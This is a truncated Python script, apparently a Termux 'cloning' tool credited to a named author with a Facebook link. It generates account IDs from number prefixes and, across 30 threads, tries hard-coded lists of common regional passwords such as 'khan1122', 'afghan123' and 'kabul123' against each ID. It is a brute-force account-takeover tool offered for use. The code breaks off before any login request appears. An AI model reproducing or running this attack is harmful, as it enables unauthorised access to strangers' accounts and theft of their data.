...
logo=("""\033[1;93m
 \033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
  ...
  /USMAN                                                                                                                                                                                                                                                
ZZZZZZZZZZZZZZZZZZZUUUUUUUU     UUUUUUUUBBBBBBBBBBBBBBBBB   IIIIIIIIII               AAA               HHHHHHHHH     HHHHHHHHH
Z:::::::::::::::::ZU::::::U     U::::::UB::::::::::::::::B  I::::::::I              A:::A              H:::::::H     H:::::::H
Z:::::::::::::::::ZU::::::U     U::::::UB::::::BBBBBB:::::B I::::::::I             A:::::A             H:::::::H     H:::::::H
Z:::ZZZZZZZZ:::::Z UU:::::U     U:::::UUBB:::::B     B:::::BII::::::II            A:::::::A            HH::::::H     H::::::HH
ZZZZZ     Z:::::Z   U:::::U     U:::::U   B::::B     B:::::B  I::::I             A:::::::::A             H:::::H     H:::::H  
        Z:::::Z     U:::::D     D:::::U   B::::B     B:::::B  I::::I            A:::::A:::::A            H:::::H     H:::::H  
...
Z::::::ZZZZZZZZ:::Z U:::::::UUU:::::::U BB:::::BBBBBB::::::BII::::::II   A:::::A             A:::::A   HH::::::H     H::::::HH
Z:::::::::::::::::Z  UU:::::::::::::UU  B:::::::::::::::::B I::::::::I  A:::::A               A:::::A  H:::::::H     H:::::::H
Z:::::::::::::::::Z    UU:::::::::UU    B::::::::::::::::B  I::::::::I A:::::A                 A:::::A H:::::::H     H:::::::H
ZZZZZZZZZZZZZZZZZZZ      UUUUUUUUU      BBBBBBBBBBBBBBBBB   IIIIIIIIIIAAAAAAA                   AAAAAAAHHHHHHHHH     HHHHHHHHH
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[AUTHOR                   • \33[1;38mUSMAN ZUBIAH ]\33[1;38m     ║\033[1;31m 
╠══[FACEBOOK                 •https://www.facebook.com/profile.php?id=100076548819093  ]   ║  \033[1;97m  
╠══[REGIONAL                • AFGHANISTAN]  ║\33[1;35m 
╠══[TOOLS                    • Free ]         ║ \33[1;32m   
...
def menu():
		...
		#	linex()
			...
			if xd in ['1','01']:
				clear()
				print(' Put file example:  /sdcard/ZUBIAH.txt  etc..')
				linex()
...
def pak():
		user=[]
		clear()
		print('\033[1;35m Code example: 9377,9378,9374,')
		...
		with tred(max_workers=30) as SK:	
			...
			for psx in user:
				ids = code+psx
				if pcs in ['1','01']:
					passlist = [psx,ids,'khankhan','khan1122','ali12345','khanbaba','pakistan','khan12345','ali1122','khankhan12345','khan','baloch','pubg','pubg1122','khan','afghan','afghan123','afghanistan','afghan1234','afghan12345','Afghani']
				if pcs in ['2','02']:
					passlist = [psx,ids,'khankhan','khan1122','ali12345','khanbaba','pakistan','khan12345','ali1122','khankhan12345','khan','baloch','pubg','pubg1122','khan','afghan','afghan123','afghanistan','afghan1234','afghan12345','Afghani']
				elif pcs in ['3','03']:
					passlist = [psx,ids,'khankhan','khan1122','ali12345','khanbaba','pakistan','khan12345','ali1122','khankhan12345','khan','baloch','pubg','pubg1122','khan','afghan','afghan123','afghanistan','afghan1234','afghan12345','Afghani']
					...
					passlist = [psx,ids,'khankhan','khan1122','ali12345','khanbaba','pakistan','khan12345','ali1122','khankhan12345','khan','baloch','pubg','pubg1122','khan','afghan','afghan123','afghanistan','afghan1234','afghan12345','Afghani','afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123']
				if mthd in ['1','01']:
